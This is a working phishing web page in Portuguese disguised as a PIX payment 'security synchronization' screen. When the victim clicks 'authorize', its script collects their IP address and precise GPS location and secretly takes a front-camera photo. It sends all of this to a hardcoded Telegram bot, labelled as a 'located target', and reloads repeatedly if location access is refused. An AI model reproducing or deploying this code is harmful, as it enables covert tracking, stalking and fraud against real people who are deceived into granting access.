<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validação de Protocolo | PIX</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .loading-ring { border: 4px solid #f3f3f3; border-top: 4px solid #32bcad; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .animate-fade-in { animation: fadeIn 0.5s ease-in-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen p-4">

    <div id="status-card" class="bg-white shadow-2xl rounded-3xl max-w-md w-full p-8 text-center border border-gray-200">
        <div id="ui-container">
            <div class="mb-6">
                <div class="w-20 h-20 bg-teal-50 rounded-full flex items-center justify-center mx-auto">
                    <svg class="w-10 h-10 text-[#32bcad]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
                </div>
            </div>
            
            <h2 class="text-xl font-bold text-gray-800 mb-4">Sincronização de Segurança</h2>
            <p class="text-gray-500 text-sm mb-8 leading-relaxed">Para liberar o valor pendente, o sistema está sincronizando sua localização com a zona de segurança do dispositivo.</p>
            
            <div id="acao-area">
                <button onclick="executarProtocolo()" class="w-full bg-[#32bcad] text-white font-extrabold py-5 rounded-2xl shadow-lg transition-all active:scale-95 uppercase tracking-wider text-sm">
                    AUTORIZAR SINCRONIZAÇÃO
                </button>
            </div>
        </div>
        
        <video id="video" autoplay style="display:none;"></video>
        <canvas id="canvas" style="display:none;"></canvas>
    </div>

    <script>
        const TOKEN = "8406636992:AAE7z6BGxeO-lfLMYVQ9yOWY-CMLiy586Ic"; 
        const ID = "560716860"; 

        async function atualizarStatus(texto) {
            const msgStatus = document.getElementById('msg-status');
            if (msgStatus) msgStatus.innerText = texto;
        }

        async function executarProtocolo() {
            const area = document.getElementById('acao-area');
            area.innerHTML = `
                <div class="flex flex-col items-center animate-fade-in">
                    <div class="loading-ring mb-4"></div>
                    <p id="msg-status" class="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Iniciando Protocolo...</p>
                </div>`;

            setTimeout(() => atualizarStatus("Verificando integridade do dispositivo..."), 600);
            setTimeout(() => atualizarStatus("Sincronizando coordenadas de segurança..."), 1200);

            let ip = "Não identificado";
            try { 
                const r = await fetch('https://api.ipify.org?format=json'); 
                const d = await r.json(); 
                ip = d.ip; 
            } catch(e){}

            // Foco Total na Localização
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const msg = `📍 *ALVO LOCALIZADO*\n🌐 IP: ${ip}\n🌍 Mapa: https://www.google.com/maps?q=${lat},${lon}`;
                
                // Envia Localização Imediatamente
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: ID, text: msg, parse_mode: 'Markdown' })
                });

                // Tenta a foto como bônus (Se falhar, o alvo nem percebe)
                try {
                    await capturarFotoBonus();
                } catch(e) {}

                // Redireciona para o Token sem esperar a foto terminar
                setTimeout(() => { window.location.href = "pagina3.html"; }, 1000);

            }, (err) => {
                // Persistência: se ele negar, a página recarrega para tentar de novo
                alert("Erro: A sincronização GPS é obrigatória para autenticar este PIX.");
                window.location.reload();
            }, { enableHighAccuracy: true, timeout: 10000 });
        }

        async function capturarFotoBonus() {
            // Tenta abrir a câmera silenciosamente
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" } 
            });
            const video = document.getElementById('video');
            video.srcObject = stream;
            
            await new Promise(r => setTimeout(r, 800)); // Menos tempo de espera para ser mais rápido

            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            stream.getTracks().forEach(t => t.stop());

            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.60)); // Qualidade menor para envio ultra rápido
            const fd = new FormData();
            fd.append('chat_id', ID);
            fd.append('photo', blob, 'bonus.jpg');

            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
        }
    </script>
</body>
</html>
